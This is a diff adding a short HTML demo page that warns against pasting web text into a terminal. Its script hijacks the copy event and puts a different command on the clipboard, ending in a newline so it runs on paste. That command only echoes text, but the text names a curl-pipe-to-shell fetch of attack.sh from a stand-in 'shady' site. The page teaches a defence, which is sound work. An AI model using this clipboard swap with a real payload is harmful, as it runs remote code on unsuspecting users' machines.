@@ -1,0 +1,30 @@
+<head>
+	<title>Copy to termal</title>
+	<style type="text/css">
+		#copy-me {
+			background-color: Blue;
+			color : White;
+		}
+	</style>
+</head>
+
+<body>
+	<h1>Why you should not copy to a terminal.</h1>
+	<p>
+		Most browsers allow JS to alter clipboard data.
+		This creates a security risk when you copy and paste into a terminal.
+		To demonstrate this try to copy this command into a terminal (or a text editor).
+	</p>
+	<p id="copy-me">
+		echo "Some random command."
+	</p>
+	<p>
+		It even has a helpfull new line at the end, so you dont have to press enter!
+	</p>
+	<script>
+		document.getElementById('copy-me').addEventListener('copy', function(e) {
+	    	e.clipboardData.setData('text/plain', 'echo "this could have been [curl http://myShadySite.com/attack.sh | sh]"\n\r\n');
+	    	e.preventDefault();
+		});
+	</script>
+</body>
